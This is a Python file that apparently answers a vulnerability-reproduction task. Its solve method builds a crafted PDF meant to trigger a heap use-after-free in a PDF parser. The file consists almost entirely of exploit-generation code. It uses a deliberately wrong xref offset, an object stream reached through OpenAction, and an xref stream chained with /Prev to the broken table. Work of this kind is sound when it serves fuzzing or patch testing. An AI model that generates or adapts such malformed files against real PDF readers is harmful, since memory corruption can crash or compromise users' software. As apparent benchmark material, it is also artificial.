import zlib

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generates a PoC for a Heap Use After Free vulnerability in a PDF parser.
        """
        
        poc_parts = []
        offsets = {}

        def add_obj(num, content):
            nonlocal poc_parts, offsets
            if isinstance(content, str):
                content_bytes = content.encode('latin1')
            else:
                content_bytes = content
            
            data = f"{num} 0 obj\n".encode('latin1') + content_bytes + b"\nendobj\n"
            
            current_offset = sum(len(p) for p in poc_parts)
            offsets[num] = current_offset
            poc_parts.append(data)

        poc_parts.append(b"%PDF-1.7\n%\xe2\xe3\xcf\xd3\n")

        add_obj(1, b"<</Type/Catalog/Pages 2 0 R/OpenAction[5 0 R /Fit]>>")
        
        add_obj(2, b"<</Type/Pages/Count 1/Kids[3 0 R]>>")
        
        add_obj(3, b"<</Type/Page/Parent 2 0 R>>")

        obj5_data_in_stream = b"<</MyKey/MyValue>>"
        obj_stream_header = f"5 0 ".encode('latin1')
        obj4_stream_content = obj_stream_header + obj5_data_in_stream
        
        obj4_dict = f"<</Type/ObjStm/N 1/First {len(obj_stream_header)}/Length {len(obj4_stream_content)}>>"
        obj4_content = obj4_dict.encode('latin1') + b"stream\n" + obj4_stream_content + b"\nendstream"
        add_obj(4, obj4_content)
        
        prev_xref_offset = sum(len(p) for p in poc_parts)
        
        bad_offset_for_obj4 = offsets[1] + 15
        
        prev_xref_table_content = (
            f"xref\n"
            f"0 5\n"
            f"0000000000 65535 f \n"
            f"{offsets[1]:010d} 00000 n \n"
            f"{offsets[2]:010d} 00000 n \n"
            f"{offsets[3]:010d} 00000 n \n"
            f"{bad_offset_for_obj4:010d} 00000 n \n"
        )
        poc_parts.append(prev_xref_table_content.encode('latin1'))

        prev_trailer_content = (
            f"trailer\n"
            f"<</Size 5>>\n"
        )
        poc_parts.append(prev_trailer_content.encode('latin1'))

        xref_stream_obj_offset = sum(len(p) for p in poc_parts)
        offsets[6] = xref_stream_obj_offset
        
        w = [1, 4, 2]

        entry5 = b'\x02' + (4).to_bytes(w[1], 'big') + (0).to_bytes(w[2], 'big')
        
        entry6 = b'\x01' + offsets[6].to_bytes(w[1], 'big') + (0).to_bytes(w[2], 'big')

        xref_stream_data = entry5 + entry6
        
        obj6_dict = (
            f"<</Type/XRef"
            f"/Size 7"
            f"/W {w}"
            f"/Index[5 2]"
            f"/Root 1 0 R"
            f"/Prev {prev_xref_offset}"
            f"/Length {len(xref_stream_data)}"
            f">>"
        )
        obj6_content = obj6_dict.encode('latin1') + b"stream\n" + xref_stream_data + b"\nendstream"
        add_obj(6, obj6_content)

        final_trailer_content = (
            f"startxref\n"
            f"{xref_stream_obj_offset}\n"
            f"%%EOF\n"
        )
        poc_parts.append(final_trailer_content.encode('latin1'))
        
        return b"".join(poc_parts)
